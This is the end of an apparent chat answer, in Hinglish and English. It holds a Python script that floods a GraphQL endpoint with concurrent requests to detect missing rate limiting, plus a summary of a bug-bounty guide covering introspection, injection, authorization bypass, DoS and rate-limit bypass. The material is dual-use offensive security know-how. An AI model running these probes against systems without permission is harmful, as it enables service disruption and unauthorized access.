    # Test different concurrency levels
    concurrency_levels = [5, 10, 20, 50, 100]
    
    base_query = '{ user(id: "1") { id name email } }'
    
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    def send_request():
        try:
            response = requests.post(
                endpoint,
                json={"query": base_query},
                headers=headers,
                timeout=10
            )
            return {
                'status_code': response.status_code,
                'response_time': response.elapsed.total_seconds(),
                'success': response.status_code == 200
            }
        except requests.RequestException:
            return {
                'status_code': 0,
                'response_time': 10,
                'success': False
            }
    
    print("🔍 Testing concurrent requests...")
    
    for concurrency in concurrency_levels:
        print(f"Testing {concurrency} concurrent requests...")
        
        start_time = time.time()
        
        # Send concurrent requests
        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as executor:
            futures = [executor.submit(send_request) for _ in range(concurrency)]
            results = [future.result() for future in concurrent.futures.as_completed(futures)]
        
        end_time = time.time()
        total_time = end_time - start_time
        
        # Analyze results
        successful_requests = sum(1 for r in results if r['success'])
        avg_response_time = sum(r['response_time'] for r in results) / len(results)
        requests_per_second = concurrency / total_time
        
        result = {
            'concurrency_level': concurrency,
            'total_time': total_time,
            'successful_requests': successful_requests,
            'failed_requests': concurrency - successful_requests,
            'success_rate': successful_requests / concurrency,
            'avg_response_time': avg_response_time,
            'requests_per_second': requests_per_second
        }
        
        # Check for rate limiting
        if result['success_rate'] < 0.8:
            result['rate_limiting'] = 'DETECTED'
            print(f"⚠️ Rate limiting detected: {result['success_rate']:.2%} success rate")
        else:
            result['rate_limiting'] = 'NOT_DETECTED'
            result['vulnerability'] = 'NO RATE LIMITING'
            result['confidence'] = 'MEDIUM'
            print(f"✅ No rate limiting: {result['success_rate']:.2%} success rate")
        
        concurrent_results.append(result)
        
        time.sleep(2)  # Delay between concurrency tests
    
    return concurrent_results

# Main execution
endpoint = sys.argv[1] if len(sys.argv) > 1 else 'https://example.com/graphql'
output_dir = sys.argv[2] if len(sys.argv) > 2 else 'exploits'

print(f"⚡ Testing GraphQL batching attacks on {endpoint}")

# Test query batching
batching_results = test_query_batching(endpoint, output_dir)

# Test alias multiplication
alias_results = test_alias_multiplication(endpoint, output_dir)

# Test concurrent requests
concurrent_results = test_concurrent_requests(endpoint, output_dir)

# Combine results
all_results = {
    'endpoint': endpoint,
    'batching_tests': batching_results,
    'alias_tests': alias_results,
    'concurrent_tests': concurrent_results,
    'summary': {
        'batching_vulnerabilities': len([r for r in batching_results if 'vulnerability' in r]),
        'alias_vulnerabilities': len([r for r in alias_results if 'vulnerability' in r]),
        'concurrent_vulnerabilities': len([r for r in concurrent_results if 'vulnerability' in r])
    }
}

# Save results
with open(f"{output_dir}/graphql_batching_results.json", 'w') as f:
    json.dump(all_results, f, indent=2)

print(f"✅ GraphQL batching testing completed")
print(f"   Batching vulnerabilities: {all_results['summary']['batching_vulnerabilities']}")
print(f"   Alias vulnerabilities: {all_results['summary']['alias_vulnerabilities']}")
print(f"   Concurrent vulnerabilities: {all_results['summary']['concurrent_vulnerabilities']}")
EOF

echo "✅ GraphQL analysis completed successfully!"
```

Dost, ye complete GraphQL introspection aur injection attacks ka guide hai! Is mein sab kuch hai:

1. **GraphQL Endpoint Discovery** - Sare possible endpoints find karne ke liye
2. **Schema Introspection** - Complete schema extract karne ke liye
3. **Injection Testing** - SQL, NoSQL aur GraphQL-specific injections
4. **Authorization Bypass** - Field-level aur mutation-level bypasses
5. **DoS Attacks** - Deep nesting, alias multiplication, recursive fragments
6. **Batching Attacks** - Rate limit bypass techniques

Ye sab techniques real-world mein bohot effective hain aur $1000+ ke bugs mil sakte hain!
